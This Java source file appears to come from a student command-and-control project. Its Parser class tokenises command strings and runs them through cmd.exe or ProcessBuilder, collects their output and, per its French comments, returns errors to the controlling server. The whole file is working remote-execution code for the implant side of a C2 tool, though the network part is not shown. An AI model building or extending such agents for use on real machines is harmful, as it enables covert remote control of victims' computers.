package org.esisar.command_control.parsing;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.util.List;
import java.util.ArrayList;
import java.util.Objects;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class Parser {
    public static java.io.File currentFile = new java.io.File(System.getProperty("user.dir"));

    public static List<String> commandSplit(String message){
        List<String> result = new ArrayList<>(); //making a list
        Pattern motif = Pattern.compile("(\"[^\"]+\"|\\S+)");
        Matcher chercheur = motif.matcher(message);

        while (chercheur.find()) {
            String morceau = chercheur.group(1);
            morceau = morceau.replace("\"", "");
            result.add(morceau);
        }
        for (int i = 0; i < result.size(); i++) {
            System.out.println("Case n°" + i + " -> [" + result.get(i) + "]");
        }
        return result;
    }
    private static String lireFlux(Process execute) throws IOException {
        java.io.InputStream flux = execute.getInputStream();
        java.io.BufferedReader lecteur = new java.io.BufferedReader(new java.io.InputStreamReader(flux));
        StringBuilder responses = new StringBuilder();
        String line;
        while ((line = lecteur.readLine()) != null) {
            responses.append(line).append("\n");
        }
        return responses.toString();
    }
    
    //lance une commande en paramétre
    public static String executeCommand(String command) throws IOException {
    	try {
    		ProcessBuilder proc =  new ProcessBuilder("cmd.exe"); // mettre cmd.exe
    		proc.redirectErrorStream(true);
    		Process pro = proc.start();
    		System.out.println(command);
    		try (PrintWriter writer = new PrintWriter(pro.getOutputStream())) {
                writer.println(command);
                writer.println("exit"); 
                writer.flush();
                StringBuilder output = new StringBuilder();
                try (BufferedReader reader = new BufferedReader(new InputStreamReader(pro.getInputStream()))) {
                    String line;
                    while ((line = reader.readLine()) != null) {
                        output.append(line).append("\n");
                        System.out.println(line); // Pour voir en temps réel dans ta console
                    }
                }
                return output.toString();
            }
    	} catch (IOException e) {
            if (e.getMessage().contains("error=2")) {
                Process executeFallback = new ProcessBuilder("cmd.exe", "/c" , String.join(" ", command)).directory(currentFile).start();
                return lireFlux(executeFallback);

            } else {
                // Si c'est une autre erreur grave, on la renvoie au serveur
                return "Erreur critique d'exécution : " + e.getMessage() + "\n";
            }
        }

    }
    //Lance un process en paramétre
    public static String executeProcess(String commande) throws IOException {

        List<String> command = commandSplit(commande);

        try {
            Process execute = new ProcessBuilder(command).directory(currentFile).start();

            return lireFlux(execute);
        } catch (IOException e) {
            if (e.getMessage().contains("error=2")) {
                Process executeFallback = new ProcessBuilder("cmd.exe", "/c" , String.join(" ", command)).directory(currentFile).start();
                return lireFlux(executeFallback);

            } else {
                // Si c'est une autre erreur grave, on la renvoie au serveur
                return "Erreur critique d'exécution : " + e.getMessage() + "\n";
            }
        }



    }}